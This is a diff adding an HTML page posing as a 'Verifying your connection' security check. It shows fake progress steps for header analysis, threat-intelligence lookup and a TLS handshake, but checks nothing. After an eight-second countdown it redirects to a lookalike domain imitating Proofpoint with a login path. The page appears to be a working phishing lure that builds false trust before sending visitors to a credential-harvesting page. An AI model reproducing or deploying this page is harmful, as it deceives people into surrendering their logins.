@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check | Please Wait</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --success: #10b981;
+            --bg: #0f172a;
+            --card: #1e293b;
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            background-color: var(--bg);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: var(--text);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--card);
+            border: 1px solid #334155;
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+        }
+
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .shield-icon {
+            width: 64px;
+            height: 64px;
+            fill: none;
+            stroke: var(--primary);
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            animation: pulse 2s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 8px rgba(37, 99, 235, 0.5)); }
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 600;
+            text-align: center;
+            margin: 0 0 8px 0;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin: 0 0 30px 0;
+        }
+
+        /* Checklist Styles */
+        .steps {
+            margin-bottom: 30px;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            padding: 10px 0;
+            border-bottom: 1px solid #334155;
+            color: var(--text-muted);
+            transition: color 0.3s ease;
+        }
+
+        .step-item:last-child {
+            border-bottom: none;
+        }
+
+        .step-item.active { color: var(--text); }
+        .step-item.completed { color: var(--success); }
+
+        .indicator {
+            width: 18px;
+            height: 18px;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-mini {
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            border-left-color: var(--primary);
+            animation: spin 0.8s linear infinite;
+        }
+
+        .checkmark {
+            width: 18px;
+            height: 18px;
+            fill: none;
+            stroke: var(--success);
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .pending-dot {
+            width: 6px;
+            height: 6px;
+            background: #475569;
+            border-radius: 50%;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Real-time Meta Data Box */
+        .meta-box {
+            background: #0f172a;
+            border-radius: 8px;
+            padding: 12px 16px;
+            font-family: monospace;
+            font-size: 11px;
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .meta-line span { color: #e2e8f0; }
+
+        /* Countdown Text */
+        .countdown-container {
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        #timer {
+            color: var(--primary);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="card">
+            <div class="icon-container">
+                <svg class="shield-icon" viewBox="0 0 24 24">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+            </div>
+
+            <h1>Verifying your connection</h1>
+            <p class="subtitle">Please wait securely while we evaluate your connection.</p>
+
+            <!-- Verification Checklist -->
+            <div class="steps">
+                <div class="step-item active" id="step1">
+                    <div class="indicator" id="ind1"><div class="spinner-mini"></div></div>
+                    <div class="step-text">Analyzing incoming package headers...</div>
+                </div>
+                <div class="step-item" id="step2">
+                    <div class="indicator" id="ind2"><div class="pending-dot"></div></div>
+                    <div class="step-text">Checking IP address threat intelligence databases...</div>
+                </div>
+                <div class="step-item" id="step3">
+                    <div class="indicator" id="ind3"><div class="pending-dot"></div></div>
+                    <div class="step-text">Finalizing encrypted TLS 1.3 handshake...</div>
+                </div>
+            </div>
+
+            <!-- Diagnostics -->
+            <div class="meta-box">
+                <div class="meta-line">Protocol: <span>TLSv1.3</span></div>
+                <div class="meta-line">Target: <span id="meta-domain">Initializing...</span></div>
+                <div class="meta-line">Status: <span id="meta-status" style="color: #f59e0b;">Evaluating</span></div>
+            </div>
+
+            <!-- The Live Countdown Text -->
+            <div class="countdown-container">
+                Redirecting automatically in <span id="timer">8</span> seconds...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const DESTINATION_URL = "https://proofpointessentials.ink/app.login/"; 
+
+        document.getElementById('meta-domain').textContent = window.location.hostname || "localhost";
+
+        const checkmarkSVG = `<svg class="checkmark" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+        const spinnerHTML = `<div class="spinner-mini"></div>`;
+
+        // 1. MANAGE VERIFICATION STEPS ANIMATION TIMING
+        setTimeout(() => {
+            completeStep('step1', 'ind1');
+            startStep('step2', 'ind2');
+        }, 2500);
+
+        setTimeout(() => {
+            completeStep('step2', 'ind2');
+            startStep('step3', 'ind3');
+        }, 5000);
+
+        setTimeout(() => {
+            completeStep('step3', 'ind3');
+            document.getElementById('meta-status').textContent = "Verified";
+            document.getElementById('meta-status').style.color = "#10b981";
+        }, 7200);
+
+        // 2. MANAGE THE LIVE COUNTDOWN TIMER TEXT
+        let timeLeft = 8;
+        const timerElement = document.getElementById('timer');
+
+        const countdownInterval = setInterval(() => {
+            timeLeft--;
+            timerElement.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                window.location.href = DESTINATION_URL;
+            }
+        }, 1000);
+
+        function startStep(stepId, indId) {
+            document.getElementById(stepId).classList.add('active');
+            document.getElementById(indId).innerHTML = spinnerHTML;
+        }
+
+        function completeStep(stepId, indId) {
+            const step = document.getElementById(stepId);
+            step.classList.remove('active');
+            step.classList.add('completed');
+            document.getElementById(indId).innerHTML = checkmarkSVG;
+        }
+    </script>
+
+</body>
+</html>
